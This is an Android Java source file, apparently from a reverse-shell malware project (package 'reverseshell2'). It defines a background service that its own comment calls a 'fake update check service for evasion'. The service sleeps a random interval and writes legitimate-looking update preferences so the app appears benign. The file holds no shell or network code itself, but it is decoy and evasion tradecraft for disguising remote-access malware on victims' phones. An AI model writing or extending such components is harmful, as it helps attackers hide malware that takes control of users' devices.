package com.example.reverseshell2;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.util.Random;

/**
 * Fake update check service for evasion - simulates legitimate app behavior
 */
public class UpdateCheckService extends Service {
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Simulate checking for updates in background
        new Thread(this::performFakeUpdateCheck).start();
        
        return START_STICKY;
    }
    
    private void performFakeUpdateCheck() {
        try {
            // Simulate network delay for update check
            Thread.sleep(new Random().nextInt(5000) + 3000);
            
            // Simulate legitimate operations
            System.gc();
            
            // Create legitimate-looking shared preferences
            getSharedPreferences("update_prefs", MODE_PRIVATE)
                .edit()
                .putLong("last_update_check", System.currentTimeMillis())
                .putString("app_version", "2.1.3")
                .putBoolean("auto_update", true)
                .apply();
                
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } finally {
            stopSelf();
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}